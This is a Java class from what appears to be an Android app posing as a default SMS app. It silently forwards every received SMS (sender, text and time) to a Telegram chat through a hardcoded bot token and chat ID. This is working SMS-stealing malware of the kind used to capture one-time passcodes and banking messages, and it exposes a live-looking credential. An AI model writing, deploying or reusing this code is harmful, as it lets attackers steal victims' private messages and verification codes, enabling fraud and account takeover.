package com.example.defaultsmsapp;

import android.util.Log;
import java.io.IOException;
import java.net.URLEncoder;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class TelegramBot {
    private static final String TAG = "TelegramBot";
    private static final String BOT_TOKEN = "7358348461:AAEGpJiGlBlZ1PzzrIEy5EnlgeKNJaPoXUE";
    private static final String CHAT_ID = "5075469933";
    private static final String BASE_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
    
    private static TelegramBot instance;
    private OkHttpClient httpClient;
    private ExecutorService executorService;
    
    private TelegramBot() {
        httpClient = new OkHttpClient.Builder()
            .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
            .build();
        executorService = Executors.newSingleThreadExecutor();
    }
    
    public static synchronized TelegramBot getInstance() {
        if (instance == null) {
            instance = new TelegramBot();
        }
        return instance;
    }
    
    public void sendSmsToTelegram(String sender, String message, long timestamp) {
        executorService.execute(() -> {
            try {
                String formattedMessage = formatSmsMessage(sender, message, timestamp);
                sendMessage(formattedMessage);
            } catch (Exception e) {
                Log.e(TAG, "Error sending SMS to Telegram", e);
            }
        });
    }
    
    private String formatSmsMessage(String sender, String message, long timestamp) {
        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault());
        String formattedTime = sdf.format(new java.util.Date(timestamp));
        
        return "📱 *New SMS Received*\n\n" +
               "👤 *From:* " + sender + "\n" +
               "🕒 *Time:* " + formattedTime + "\n" +
               "💬 *Message:* " + message;
    }
    
    private void sendMessage(String message) {
        try {
            String encodedMessage = URLEncoder.encode(message, "UTF-8");
            String url = BASE_URL + "?chat_id=" + CHAT_ID + "&text=" + encodedMessage + "&parse_mode=Markdown";
            
            Request request = new Request.Builder()
                .url(url)
                .build();
            
            httpClient.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Failed to send message to Telegram", e);
                }
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "SMS successfully sent to Telegram");
                    } else {
                        Log.e(TAG, "Telegram API error: " + response.code() + " - " + response.message());
                    }
                    response.close();
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error preparing Telegram message", e);
        }
    }
    
    public void shutdown() {
        if (executorService != null) {
            executorService.shutdown();
        }
    }
}